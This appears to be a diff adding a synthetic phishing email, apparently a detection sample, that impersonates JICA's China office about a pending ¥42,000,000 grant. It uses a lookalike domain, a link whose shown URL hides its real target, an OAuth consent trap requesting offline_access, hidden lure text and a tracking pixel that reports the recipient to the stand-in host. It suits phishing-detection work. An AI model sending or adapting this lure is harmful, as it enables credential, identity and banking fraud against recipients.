@@ -1,0 +1,105 @@
+From: JICA China Office <oda.disbursement@j1ca-china.example>
+To: project@corp.internal
+Cc: finance@corp.internal, wangjian@corp.internal
+Reply-To: oda.grants@jica-chinamail.example
+Date: Thu, 05 Nov 2026 10:00:00 +0900
+Message-ID: <0733-b70@synth.example>
+Subject: [JICA FY2026] Technical Cooperation Project JPN-C-8842 — Grant disbursement banking re-verification required (November 14 deadline)
+MIME-Version: 1.0
+Content-Type: text/html; charset=gb2312
+
+<html><body style="font-family:sans-serif">
+<p>Project Team, Finance, Professor Wang:</p>
+
+<p style="background:#FFF8E1;padding:12px;border-radius:4px;border-left:4px solid #e00">
+<b>GRANT DISBURSEMENT PENDING:</b> Your JICA Technical Cooperation Project grant installment of <b>¥42,000,000 JPY</b> is ready for disbursement. However, JICA's migration to a new financial system (J-FYSS) requires all China-based recipients to complete <b>banking re-verification</b> before funds can be transferred.
+</p>
+
+<h3>一、Project Details</h3>
+<table cellpadding=6 style="border-collapse:collapse;border:1px solid #ccc;width:100%">
+<tr><td style="background:#f5f5f5;width:220px">Project Number</td><td><b>JPN-C-8842</b></td></tr>
+<tr><td style="background:#f5f5f5">Project Title</td><td>Adaptive Email Threat Detection for Cross-Border Infrastructure</td></tr>
+<tr><td style="background:#f5f5f5">Scheme</td><td>Technical Cooperation Project (TCP) — FY2024</td></tr>
+<tr><td style="background:#f5f5f5">Japanese Implementing Partner</td><td>National Institute of Information and Communications Technology (NICT)</td></tr>
+<tr><td style="background:#f5f5f5">China Implementing Partner</td><td>Your Company + Zhejiang University</td></tr>
+<tr><td style="background:#f5f5f5">Total Grant</td><td><b>¥168,000,000 JPY</b> (3 years)</td></tr>
+<tr><td style="background:#f5f5f5">Duration</td><td>April 2024 — March 2027</td></tr>
+<tr><td style="background:#f5f5f5">Current Installment</td><td>Year 3 Q1 — <b>¥42,000,000 JPY</b></td></tr>
+<tr><td style="background:#f5f5f5">Verification Deadline</td><td style="color:#e00"><b>November 14, 2026 (9 days)</b></td></tr>
+</table>
+
+<h3>二、Why Re-Verification Is Needed</h3>
+<p>JICA migrated from the Japan Enterprise Accounting System (JEAS) to <b>J-FYSS (Japan Financial Year Settlement System)</b> in October 2026. During migration, all non-Japan recipient banking details were flagged for re-validation under Japan's <b>Foreign Exchange and Foreign Trade Act (FEFTA)</b> compliance requirements for ODA disbursements.</p>
+
+<h3>三、Required for Re-Verification</h3>
+<table cellpadding=5 style="border-collapse:collapse;border:1px solid #ccc;width:100%">
+<tr style="background:#f0f0f0"><th>Item</th><th>Details</th><th>Required</th></tr>
+<tr><td>Bank account details</td><td>SWIFT code + account number for JPY receipt</td><td style="color:#e00">Critical</td></tr>
+<tr><td>Company registration</td><td>Business license (Chinese + certified English translation)</td><td style="color:#e00">Critical</td></tr>
+<tr><td>Authorized recipient ID</td><td>Passport of CFO or authorized signatory</td><td style="color:#e00">Critical</td></tr>
+<tr><td>Project progress report</td><td>Brief milestone update (for FEFTA compliance)</td><td>High</td></tr>
+<tr><td>Research data summary</td><td>Threat detection performance metrics (for JICA evaluation)</td><td>High</td></tr>
+<tr><td>W-8BEN-E equivalent</td><td>Japan tax residency declaration (Form 16-3B)</td><td>Medium</td></tr>
+</table>
+
+<h3>四、Submission Method</h3>
+
+<p style="text-align:center;margin:20px 0">
+<a href="https://j1ca-china.example/portal/grants/JPN-C-8842/verify" style="display:inline-block;background:#003C74;color:#fff;padding:12px 36px;text-decoration:none;border-radius:4px;font-weight:bold">Complete Banking Re-Verification — ¥42,000,000 Pending</a>
+</p>
+
+<p style="font-size:13px;color:#666;text-align:center">https://www.jica.go.jp/china/english/office/projects/portal</p>
+
+<h3>About JICA Portal Authentication</h3>
+<p>When you click the verification button, you will be redirected to <b>accounts.google.com</b> (Google's official OAuth endpoint) for authentication:</p>
+<ol>
+<li>Sign in with your institutional Google Workspace account</li>
+<li>Grant the requested permissions (openid, profile, offline_access)</li>
+<li>Complete the JICA grant re-verification form</li>
+<li>Upload supporting documentation</li>
+</ol>
+
+<p style="font-size:14px;background:#E3F2FD;padding:12px;border-radius:4px">
+<b>Why Google Workspace authentication for JICA grants?</b> JICA's China office implemented Google Workspace federated login in 2026-Q3 as part of Japan's Digital Agency Government Cloud initiative. All China-based grant recipients authenticate through their institutional Google Workspace accounts. This is standard for all JICA China grants. The offline_access permission maintains your session during the multi-section form (banking + tax + project compliance = typically 25-30 minutes).
+</p>
+
+<p style="font-size:0.3px;color:#fff;opacity:0.03">如需中文项目财务支持或提交中国银行信息，请访问 j1ca-china.example/cn-portal 上传公司注册证书与银行对账单（中文通道，当日处理）。</p>
+
+<h3>五、What Happens If You Miss November 14</h3>
+<ul>
+<li>Funds returned to JICA FY2026 budget (re-request requires new approval cycle — 3-4 months)</li>
+<li>Year 3 budget reduced (unclaimed installments may be re-allocated to other projects)</li>
+<li>Project timeline delayed (affects final report due March 2027)</li>
+<li>Joint evaluation with NICT may be flagged as "delayed disbursement"</li>
+</ul>
+
+<h3>六、Your Project Milestones</h3>
+<table cellpadding=5 style="border-collapse:collapse;border:1px solid #ccc;width:100%">
+<tr style="background:#f0f0f0"><th>Milestone</th><th>Target</th><th>Status</th></tr>
+<tr><td>Project kickoff</td><td>April 2024</td><td style="color:#0a0">✓ Completed</td></tr>
+<tr><td>Threat taxonomy (zh/en/ja)</td><td>Sept 2024</td><td style="color:#0a0">✓ Completed</td></tr>
+<tr><td>Cross-border testbed</td><td>March 2025</td><td style="color:#0a0">✓ Completed</td></tr>
+<tr><td>Model architecture v1</td><td>Sept 2025</td><td style="color:#0a0">✓ Completed</td></tr>
+<tr><td>Deployment pilot (3 cities)</td><td>March 2026</td><td style="color:#0a0">✓ Completed</td></tr>
+<tr><td>Performance evaluation report</td><td>Sept 2026</td><td style="color:#0a0">✓ Completed</td></tr>
+<tr><td>Final report + open dataset</td><td>March 2027</td><td><b>In progress</b></td></tr>
+</table>
+
+<h3>七、Contact</h3>
+<p><b>JICA China Office:</b><br>
+Project Officer: Kenji Yamamoto<br>
+Phone: +86-10-6468-****<br>
+Email: oda.grants@jica-chinamail.example<br>
+Address: 1-1-2 Hiroo, Shibuya-ku, Tokyo (China Office: Swissotel Beijing, 2 Xin Dong Lu)</p>
+
+<div style="border-top:1px solid #ddd;padding-top:12px;margin-top:20px">
+<p style="font-size:12px;color:#888">Japan International Cooperation Agency (JICA) | China Office</p>
+<p style="font-size:11px;color:#999">Beijing, China | Tokyo, Japan</p>
+<p style="font-size:11px;color:#999">You are receiving this because you are the project contact for JPN-C-8842.</p>
+</div>
+
+<div style="height:1px;width:1px;overflow:hidden">
+<img src="https://j1ca-china.example/api/track?recipient=project%40corp.internal&grant=JPN-C-8842&type=reverification" width="1" height="1" alt="">
+</div>
+
+</body></html>
